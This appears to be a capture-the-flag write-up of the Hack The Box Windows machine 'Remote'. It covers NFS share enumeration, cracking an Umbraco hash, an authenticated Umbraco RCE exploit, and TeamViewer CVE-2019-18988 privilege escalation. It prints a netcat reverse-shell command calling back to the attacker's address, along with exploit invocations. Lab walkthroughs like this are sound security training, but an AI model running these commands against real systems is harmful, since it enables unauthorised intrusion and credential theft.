---
title: HTB-Remote
draft: false
tags:
  - htb
  - windows
  - easy
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/Remote.png)

## Information Gathering
## Rustscan

Rustscan finds many ports open. NFS running on port 2049 stands out because it is not normal. 

`rustscan --addresses 10.10.10.180 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-5.png)

## Enumeration
### SMB - TCP 445

Crackmapexec reveals the domain **remote** which we add to `/etc/hosts` file. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-1.png)

Unfortunately, null login is not allowed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-2.png)

### FTP - TCP 21

Anonymous login is allowed but nothing is in the share:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-3.png)

### NFS - TCP 2049

Using `showmount -e remote`, we can list shares on nfs:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-6.png)

Let's mount the share to our local side:

`sudo mount -t nfs -o vers=3,nolock remote:/site_backups /home/yoon/Documents/htb/remote/nfs`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-7.png)

## Shell as IIS
### NFS Password Retrieval

Inside mounted nfs share, App_Data share looks interesting. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-8.png)

Umbraco.sdf could be read with strings command and it reveals a lot of information:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-10.png)

We can assume user `admin@htb.local` and `smith@htb.local` exists on the website and sha-1 encoded password hash is also shown. 

Let's crack the password hash using hashcat:

`hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa ~/Downloads/rockyou.txt --show`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/remote-h.png)

Password was to cracked to be **baconandcheese**. 

We should be able to use this password somewhere else as admin or smith.

### Umbraco RCE

Now let's move on to enumerating HTTP.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-4.png)

Exploring around the website, we discovered login portal for the dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-9.png)

Using the password cracked earlier as `admin@htb.local`, we can sign in to dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-11.png)

So the website seems to be running **Umbraco** and doing some researched on it revealed that certain versions are vulnerable to [Authenticated RCE](https://github.com/Jonoans/Umbraco-RCE/tree/master). 

Running the exploit found from [here](https://github.com/Jonoans/Umbraco-RCE/tree/master), we now have a interactive shell:

`python3 umbraco_rce.py -u admin@htb.local -p baconandcheese -w 'http://10.10.10.180/' -i 10.10.14.36`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-12.png)

However, this shell seems to be some what broken. It wouldn't show output to certain commands:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-13.png)

Using smbserver, we will copy nc.exe to the target:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-14.png)

By spawning a second shell inside the first shell, now we have fully interactive shell environment:

`./nc.exe 10.10.14.36 1337 -e cmd`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-15.png)



## Privesc: IIS to Administrator
### TeamViewer

`tasklist` command shows the services running on the system and **TemViewer** stands out:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-16.png)

Inside `Program Files (x86)`, we can access TeamViewer:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-17.png)

It seems to be running as Version7:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-18.png)

### CVE-2019-18988

Through some googling on TeamViewer version 7, we discovered CVE-2019-18988:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-19.png)

Upon uploading and running [this bat file](https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat), we can rerieve SecurityPasswordAES in plain text:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-20.png)

By running the discovered AES value through [this Python script](https://github.com/reversebrain/CVE-2019-18988/blob/master/CVE-2019-18988.py), we can crack the password: **!R3m0te!**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-21.png)

Trying the cracked password as the administrator, it worked:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/remote/image-22.png)

## References
- https://github.com/Jonoans/Umbraco-RCE/tree/master
- https://github.com/reversebrain/CVE-2019-18988/blob/master/CVE-2019-18988.py
- https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
